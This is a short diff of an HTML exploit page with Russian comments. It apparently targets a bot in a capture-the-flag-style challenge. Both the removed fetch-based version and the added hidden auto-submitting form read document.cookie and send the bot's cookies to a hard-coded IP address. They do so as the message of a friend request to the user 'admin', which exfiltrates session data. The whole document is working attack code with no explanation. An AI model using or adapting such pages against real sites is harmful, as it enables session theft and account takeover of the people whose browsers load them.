@@ -2,21 +2,27 @@
 <html>
 <body>
     <script>
-        // Получаем все cookies бота
-        const cookies = document.cookie;
+        // Создаём форму с cookies
+        const form = document.createElement('form');
+        form.method = 'POST';
+        form. action = 'http://158.160.184.159:13002/api/friendship/request';
         
-        // Отправляем запрос в друзья с cookies в message
-        fetch('http://158.160.184.159:13002/api/friendship/request', {
-            method: 'POST',
-            credentials: 'include',  // Отправляет cookies бота для авторизации
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                to_user: "admin",
-                message: cookies
-            })
-        });
+        const inputUser = document.createElement('input');
+        inputUser.type = 'hidden';
+        inputUser.name = 'to_user';
+        inputUser.value = 'admin';
+        
+        const inputMessage = document.createElement('input');
+        inputMessage.type = 'hidden';
+        inputMessage.name = 'message';
+        inputMessage.value = document.cookie;  // Все cookies бота
+        
+        form.appendChild(inputUser);
+        form.appendChild(inputMessage);
+        document.body.appendChild(form);
+        
+        // Отправляем форму
+        form.submit();
     </script>
 </body>
 </html>
